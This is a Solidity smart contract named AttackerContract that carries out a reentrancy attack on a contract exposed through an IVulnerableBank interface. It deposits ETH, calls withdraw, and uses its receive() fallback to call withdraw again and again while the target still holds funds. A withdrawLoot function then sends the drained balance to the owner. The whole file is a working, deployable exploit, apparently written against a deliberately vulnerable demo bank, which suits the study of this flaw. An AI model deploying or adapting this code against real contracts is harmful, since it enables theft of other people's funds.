// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

interface IVulnerableBank {
    function deposit() external payable;
    function withdraw() external;
    function getContractBalance() external view returns (uint256);
    function balances(address user) external view returns (uint256);
}

contract AttackerContract {
    IVulnerableBank public target;
    address public owner;
    bool public attackInProgress;

    event AttackStarted(address indexed attacker, uint256 amount);
    event Reentered(address indexed attacker, uint256 amount);
    event AttackFinished(address indexed attacker, uint256 contractBalance);

    modifier onlyOwner() {
        require(msg.sender == owner, "Only owner can call this function");
        _;
    }

    constructor(address _target) {
        target = IVulnerableBank(_target);
        owner = msg.sender;
    }

    function attack() external payable onlyOwner {
        require(msg.value > 0, "Send ETH to start attack");
        require(!attackInProgress, "Attack already in progress");

        attackInProgress = true;

        emit AttackStarted(msg.sender, msg.value);

        target.deposit{value: msg.value}();
        target.withdraw();

        attackInProgress = false;

        emit AttackFinished(msg.sender, address(this).balance);
    }

    receive() external payable {
        if (attackInProgress && address(target).balance >= 1 ether) {
            emit Reentered(owner, 1 ether);
            target.withdraw();
        }
    }

    function withdrawLoot() external onlyOwner {
        uint256 amount = address(this).balance;
        require(amount > 0, "No ETH to withdraw");

        (bool success, ) = payable(owner).call{value: amount}("");
        require(success, "Loot transfer failed");
    }

    function getContractBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
